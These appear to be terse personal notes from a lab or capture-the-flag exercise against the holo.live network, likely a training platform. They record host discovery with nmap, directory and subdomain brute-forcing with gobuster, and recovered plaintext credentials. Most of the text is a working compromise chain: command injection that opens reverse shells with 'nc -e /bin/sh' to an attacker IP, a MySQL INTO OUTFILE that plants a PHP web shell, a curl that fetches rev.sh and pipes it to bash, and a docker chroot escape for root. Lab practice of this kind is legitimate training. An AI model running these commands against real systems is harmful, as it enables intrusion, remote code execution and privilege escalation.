> route   # command on local machin after vpn connect
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.28.2    0.0.0.0         UG    100    0        0 eth0
10.50.103.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
10.200.107.0    10.50.103.1     255.255.255.0   UG    1000   0        0 tun0
192.168.28.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0
find out which hosts are available by doing a quick pingsweep 

> sudo nmap -sn -n 10.200.107.0/24 192.168.100.0/24 -oA Ping-Sweep
> 10.200.107.33
> 10.200.107.250
> # The -sn flag means disable port scanning, as I’m only interested in the available hosts, not the specific ports at the moment.
> The -n flag means do not do a DNS lookup. This speeds up the scan.

> sudo nmap -sS 10.200.142.33 10.200.142.250 -v -oA Initial-Scan-Subnet1-Hosts
> sudo nmap -sS -p- 10.200.142.33 10.200.142.250 -v -oA All-Ports
> sudo nmap -sV -sC -A 10.200.142.33 -p 22,80,33060 -oA 10.200.142.33-Script-Scan
> sudo nmap -sV -sC -A 10.200.142.250 -p 22,1337 -oA 10.200.142.250-Script-Scan

> 10.200.107.33
> Port - 22. 80
> 10.200.107.250
> Port - 22, 1337

gobuster dns -u holo.live -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 2

gobuster dir -u www.holo.live -w ~/Documents/Tools/SecLists/Discovery/Web-Content/big.txt -t 2 -o www_subdir.txt -x php,html,htm,txt,bak,zip
gobuster dir -u dev.holo.live -w ~/Documents/Tools/SecLists/Discovery/Web-Content/big.txt -t 2 -o dev.holo.live -x php,html,htm,txt,bak,zip
gobuster dir -u admin_subdir.txt_ -w ~/Documents/Tools/SecLists/Discovery/Web-Content/big.txt -t 2 -o admin_subdir.txt -x php,html,htm,txt,bak,zip

admin.holo.live
admin:DBManagerLogin!
admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.103.67+4443
mysql -u admin -p -h 192.168.100.1
Using password: !123SecureAdminDashboard321!
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
curl 192.168.100.1:8080/shell.php?cmd=nc+-e+/bin/sh+10.50.103.67+4445

curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.67%3A80%2Frev.sh%7Cbash%20%26'
/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh

ssh-keygen -t rsa # in local

